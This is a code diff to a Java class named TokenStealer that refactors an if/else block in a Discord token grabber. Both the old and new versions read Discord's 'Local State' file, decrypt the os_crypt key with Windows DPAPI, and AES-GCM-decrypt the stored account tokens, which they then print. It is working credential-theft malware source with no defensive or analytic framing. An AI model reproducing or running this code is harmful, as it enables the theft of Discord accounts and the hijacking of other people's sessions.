@@ -34,26 +34,26 @@ public class TokenStealer {
 
 				if (!matcher.find()) {
 					continue;
-				} else {
-					byte[] key, tokens;
-					
-					String reader = FileUtils.readFileToString(new File((discordPath + "/Local State")), StandardCharsets.UTF_8.toString());
-					JsonObject json = new JsonParser().parseString(reader).getAsJsonObject();
-
-					key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
-					key = Base64.getDecoder().decode(key);
-					key = Arrays.copyOfRange(key, 5, key.length);
-					key = Crypt32Util.cryptUnprotectData(key);
-
-					tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());
-
-					Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
-					cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
-
-					foundTokens += new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8.toString());
-					
-					System.out.println(foundTokens);
 				}
+				
+				byte[] key, tokens;
+					
+				String reader = FileUtils.readFileToString(new File((discordPath + "/Local State")), StandardCharsets.UTF_8.toString());
+				JsonObject json = new JsonParser().parseString(reader).getAsJsonObject();
+
+				key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
+				key = Base64.getDecoder().decode(key);
+				key = Arrays.copyOfRange(key, 5, key.length);
+				key = Crypt32Util.cryptUnprotectData(key);
+				
+				tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1].getBytes());
+
+				Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+				cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
+
+				foundTokens += new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8.toString());
+					
+				System.out.println(foundTokens);
 			}
 		}
 	}
